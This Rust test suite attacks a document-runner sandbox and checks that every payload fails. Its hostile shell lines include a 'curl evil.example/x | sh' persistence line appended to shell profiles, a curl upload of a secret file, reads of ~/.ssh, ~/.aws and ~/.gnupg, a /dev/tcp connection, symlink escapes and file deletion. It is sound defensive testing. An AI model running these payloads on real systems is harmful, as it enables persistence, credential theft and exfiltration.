//! The sandbox, attacked.
//!
//! Every test here is a real payload written the way an attacker would write it, run through
//! the real `run_document` — the same path `dx run` and the `dx_run` tool take. Each one
//! asserts the attack **failed**, and where the attack leaves a trace (a file that should not
//! exist), it checks the trace is absent rather than trusting the exit code.
//!
//! This file is the evidence for the claim `doc-run::confine` makes. A change that weakens
//! the boundary is meant to be discovered here, loudly, rather than in a document someone
//! was handed.
//!
//! Three things are deliberately *not* asserted, because they are true by design:
//!
//! - **Reading is allowed.** A block is supposed to open the data next to the document.
//! - **The block's own directory is writable.** It is where a block builds what it needs.
//! - **Dependency installation reaches the network.** `npm` cannot work without it. It is
//!   confined in every other way, which `setup_cannot_write_outside_the_directories_it_was_granted`
//!   in `workdir` pins down.

use std::fs;
use std::path::{Path, PathBuf};
use std::time::Duration;

use doc_core::resolve::Nowhere;
use doc_run::{run_document, RunOptions};

/// A scratch document directory, its cache, and a clean slate each time.
fn scene(label: &str) -> (PathBuf, RunOptions) {
    let root = std::env::temp_dir().join(format!("dx-attack-{label}"));
    let _ = fs::remove_dir_all(&root);
    fs::create_dir_all(&root).expect("scene");
    let options = RunOptions {
        document_dir: root.clone(),
        cache_root: root.join("cache"),
        default_timeout: Duration::from_secs(30),
        // Approved on purpose: these payloads must actually execute — a payload the
        // review gate refused would leave every assertion green without testing the
        // sandbox at all.
        approve: true,
        ..RunOptions::default()
    };
    (root, options)
}

/// Run one shell block and hand back what it printed.
fn attack(code: &str, options: &RunOptions) -> String {
    let source = format!("::code id=payload lang=bash run\n{code}\n::end\n");
    let report = run_document(&source, options, &Nowhere).expect("acyclic run");
    report
        .runs
        .first()
        .map(|run| run.output.clone())
        .unwrap_or_default()
}

/// Whether this machine imposes a boundary at all. Without one there is nothing to test,
/// and a green suite would be a lie rather than a pass.
fn confined() -> bool {
    !doc_run::confine::overridden() && (cfg!(target_os = "macos") || cfg!(target_os = "linux"))
}

/// The file a payload tried to create, which must not be there afterwards.
fn assert_absent(path: &Path, what: &str) {
    assert!(
        !path.exists(),
        "{what}: the sandbox let a document create {}",
        path.display()
    );
}

#[test]
fn a_block_cannot_write_into_the_directory_its_document_lives_in() {
    if !confined() {
        return;
    }
    let (root, options) = scene("write-beside");
    let target = root.join("planted.txt");
    let output = attack(&format!("echo pwned > {}", target.display()), &options);
    assert_absent(&target, "a write beside the document");
    assert!(
        output.contains("not permitted") || output.contains("denied") || output.contains("error"),
        "the failure was silent: {output}"
    );
}

#[test]
fn a_block_cannot_overwrite_a_file_that_was_already_there() {
    if !confined() {
        return;
    }
    let (root, options) = scene("overwrite");
    let precious = root.join("data.csv");
    fs::write(&precious, "the original").expect("fixture");

    // Reading it is allowed and is the whole point; replacing it is not.
    let read_back = attack(&format!("cat {}", precious.display()), &options);
    assert_eq!(
        read_back, "the original",
        "a block must still read its data"
    );

    attack(
        &format!("echo destroyed > {}", precious.display()),
        &options,
    );
    attack(&format!("rm -f {}", precious.display()), &options);
    assert_eq!(
        fs::read_to_string(&precious).expect("still there"),
        "the original",
        "a document rewrote the file next to it"
    );
}

#[test]
fn a_block_cannot_write_into_the_readers_home_directory() {
    if !confined() {
        return;
    }
    let Some(home) = std::env::var_os("HOME") else {
        return;
    };
    let (_root, options) = scene("home");
    let target = PathBuf::from(home).join(".dx-attack-canary");
    let _ = fs::remove_file(&target);
    attack(&format!("echo pwned > {}", target.display()), &options);
    assert_absent(&target, "a write into $HOME");
}

/// The `.dx` itself, and the store beside it. A document that can rewrite its own repository
/// can put anything into the next person's checkout.
#[test]
fn a_block_cannot_rewrite_the_document_or_its_store() {
    if !confined() {
        return;
    }
    let (root, options) = scene("self-edit");
    fs::create_dir_all(root.join(".doc")).expect("store");
    fs::write(root.join(".doc/repo.dxcp"), "PACK").expect("pack");
    fs::write(root.join("notes.dx"), "~ dx1 abc\n").expect("pointer");

    attack(
        "echo tampered > notes.dx; echo tampered > .doc/repo.dxcp",
        &options,
    );

    assert_eq!(
        fs::read_to_string(root.join("notes.dx")).expect("read"),
        "~ dx1 abc\n"
    );
    assert_eq!(
        fs::read_to_string(root.join(".doc/repo.dxcp")).expect("read"),
        "PACK"
    );
}

/// Persistence: the payload every real attack actually wants. A shell profile, a cron entry,
/// a login item — anything that runs again after the reader has forgotten the document.
#[test]
fn a_block_cannot_install_itself_to_run_again_later() {
    if !confined() {
        return;
    }
    let Some(home) = std::env::var_os("HOME") else {
        return;
    };
    let home = PathBuf::from(home);
    let (_root, options) = scene("persistence");

    for path in [".zshrc", ".bashrc", ".profile"] {
        let target = home.join(path);
        let before = fs::read_to_string(&target).ok();
        attack(
            &format!("echo 'curl evil.example/x | sh' >> {}", target.display()),
            &options,
        );
        let after = fs::read_to_string(&target).ok();
        assert_eq!(before, after, "a document appended to {path}");
    }

    let agent = home.join("Library/LaunchAgents/dx-attack.plist");
    attack(
        &format!(
            "mkdir -p {:?} && echo x > {}",
            agent.parent().expect("parent"),
            agent.display()
        ),
        &options,
    );
    assert_absent(&agent, "a login item");
}

#[test]
fn a_block_cannot_reach_the_network() {
    if !confined() {
        return;
    }
    let (_root, options) = scene("network");

    // Three ways out, none of which is allowed to work: a name to resolve, an address to
    // connect to, and a local daemon that would do either on the block's behalf.
    let dns = attack(
        "getent hosts example.com || host example.com || nslookup example.com",
        &options,
    );
    assert!(!dns.contains("93.184"), "DNS resolved: {dns}");

    let tcp = attack(
        "exec 3<>/dev/tcp/1.1.1.1/443 && echo CONNECTED || echo refused",
        &options,
    );
    assert!(
        !tcp.contains("CONNECTED"),
        "a TCP connection was made: {tcp}"
    );

    let curl = attack("curl -s -m 8 https://example.com | head -c 20", &options);
    assert!(
        curl.trim().is_empty() || curl.contains("error"),
        "http reached out: {curl}"
    );
}

/// Read plus egress is exfiltration. Reads are open by design, so the network denial is what
/// stands between a document and everything on the disk it was opened on.
#[test]
fn a_block_that_reads_a_file_has_nowhere_to_send_it() {
    if !confined() {
        return;
    }
    let (root, options) = scene("exfiltrate");
    fs::write(root.join("secret.txt"), "hunter2").expect("fixture");
    let output = attack(
        "curl -s -m 8 -X POST --data-binary @secret.txt https://example.com/collect && echo SENT",
        &options,
    );
    assert!(!output.contains("SENT"), "the file was uploaded: {output}");
}

/// Credentials are the exception to "reads are open": these are denied outright, so a
/// document cannot even put a key on the page for a shoulder to read over.
#[test]
fn a_block_cannot_read_the_credential_stores() {
    if !confined() {
        return;
    }
    let Some(home) = std::env::var_os("HOME") else {
        return;
    };
    let home = PathBuf::from(home);
    let (_root, options) = scene("credentials");

    for store in [".ssh", ".aws", ".gnupg"] {
        let path = home.join(store);
        if !path.exists() {
            continue;
        }
        let output = attack(
            &format!("cat {}/* 2>&1 | head -c 200", path.display()),
            &options,
        );
        assert!(
            !output.contains("PRIVATE KEY") && !output.contains("aws_secret_access_key"),
            "a document read {store}: {output}"
        );
    }
}

/// The environment is a credential store too, and the most commonly full one.
#[test]
fn a_block_does_not_inherit_the_shell_it_was_started_from() {
    if !confined() {
        return;
    }
    let (_root, options) = scene("environment");
    std::env::set_var("DX_ATTACK_FAKE_TOKEN", "ghp_averyrealtoken");
    let output = attack("env | grep -c DX_ATTACK_FAKE_TOKEN || true", &options);
    std::env::remove_var("DX_ATTACK_FAKE_TOKEN");
    assert!(
        output.trim() == "0" || output.trim().is_empty(),
        "the reader's environment leaked into the block: {output}"
    );
}

/// A symlink is the classic way around a path rule: point at something outside, then write
/// through the link from inside. The kernel resolves the path before it checks it.
#[test]
fn a_block_cannot_escape_through_a_symlink_it_planted() {
    if !confined() {
        return;
    }
    let (root, options) = scene("symlink");
    let target = root.join("linked-out.txt");
    let output = attack(
        &format!(
            "ln -sf {} \"$DX_SANDBOX/escape\" && echo pwned > \"$DX_SANDBOX/escape\" && echo WROTE",
            target.display()
        ),
        &options,
    );
    assert!(
        !output.contains("WROTE"),
        "the write through the link succeeded: {output}"
    );
    assert_absent(&target, "a write through a planted symlink");
}

/// A block that shells out gets no more than the block had. Seatbelt and bubblewrap are both
/// inherited across `exec`, and this is the test that says so out loud.
#[test]
fn a_child_process_is_inside_the_same_boundary() {
    if !confined() {
        return;
    }
    let (root, options) = scene("child");
    let target = root.join("via-child.txt");
    attack(
        &format!("bash -c 'bash -c \"echo pwned > {}\"'", target.display()),
        &options,
    );
    assert_absent(&target, "a write from a grandchild process");
}

/// A block that overruns its deadline is killed, and so is everything it left running.
///
/// The marker goes inside the block's own sandbox directory (`$DX_SANDBOX`) — the one place
/// a block *may* write — so that if the child survives the kill, the write succeeds and the
/// assertion catches it. A marker outside every writable grant would be blocked by the
/// sandbox itself, and the test could never fail.
#[test]
fn a_backgrounded_process_does_not_outlive_the_block_that_started_it() {
    if !confined() {
        return;
    }
    let (root, options) = scene("background");
    let source = "::code id=payload lang=bash run timeout=2\n\
         (sleep 20; echo alive > \"$DX_SANDBOX/still-alive\") &\n\
         sleep 30\n::end\n";
    let report = run_document(source, &options, &Nowhere).expect("acyclic run");
    assert_eq!(report.runs[0].status, "error");
    assert!(report.runs[0].output.contains("timed out"));

    // If the child survived the kill, it writes the marker 20 seconds in. The sandbox
    // directory lives under the cache, at a fingerprinted path this test does not know, so
    // it looks for the marker by name.
    std::thread::sleep(Duration::from_secs(6));
    assert!(
        find_file(&root, "still-alive").is_none(),
        "a process outlived its block and wrote its marker"
    );
}

/// The first file named `name` anywhere under `root`, or `None`.
fn find_file(root: &Path, name: &str) -> Option<PathBuf> {
    for entry in fs::read_dir(root).ok()?.flatten() {
        let path = entry.path();
        if path.is_dir() {
            if let Some(found) = find_file(&path, name) {
                return Some(found);
            }
        } else if path.file_name().is_some_and(|file| file == name) {
            return Some(path);
        }
    }
    None
}

/// The one thing that must never be quiet: a machine that cannot confine code does not run
/// it, and says so in the document rather than running it anyway.
#[test]
fn a_machine_with_no_boundary_blocks_the_run_instead_of_widening_it() {
    let described = doc_run::confine::describe();
    if cfg!(target_os = "macos") {
        assert!(described == "seatbelt" || described.contains("DX_UNCONFINED"));
    } else if cfg!(target_os = "linux") {
        assert!(described == "bubblewrap" || described.contains("DX_UNCONFINED"));
    } else {
        // Nothing to impose a boundary with, so nothing may run.
        let (_root, options) = scene("no-boundary");
        let output = attack("echo ran", &options);
        assert!(
            !output.contains("ran"),
            "code ran with no sandbox: {output}"
        );
        assert!(output.contains("no sandbox"), "{output}");
    }
}
